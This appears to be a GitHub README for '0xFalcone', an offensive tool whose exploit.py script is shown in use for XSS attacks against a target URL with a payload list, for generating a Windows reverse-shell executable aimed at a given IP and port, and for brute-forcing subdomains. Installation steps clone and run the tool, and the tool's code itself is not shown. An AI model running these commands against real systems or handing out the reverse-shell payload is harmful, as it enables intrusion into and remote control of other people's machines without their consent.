# 0xFalcone
<h3>Installation</h3>
 Install 0xFalcone Tool:
<hr>

```apt install git```

``` git clone https://github.com/hassanalharbi123/0xFalcon ```

``` cd 0xFlacon ```

``` python3 install.py ```
<hr>

<h3>Usage</h3>

``` python3 exploit.py -h ```

![image](https://user-images.githubusercontent.com/76629405/147748640-229c15f4-51ca-42b6-b4b7-343a96b84785.png)

 Example XSS Tool: ``` python3 exploit.py -u xss -T http://example.com -L list.txt -m GET -n username ```
 
 Windows Reverse Shell: ``` python3 exploit.py -u shell -y exe -I 127.0.0.1 -P 1111 -F payloadexe  ```
 
 ![image](https://user-images.githubusercontent.com/76629405/147749039-ac562649-0096-4e82-a004-5071f8e8384f.png)
 
 Subdomains Brute Force: ``` python3 exploit.py -u subdomain -T http://example.com -L list.txt ```
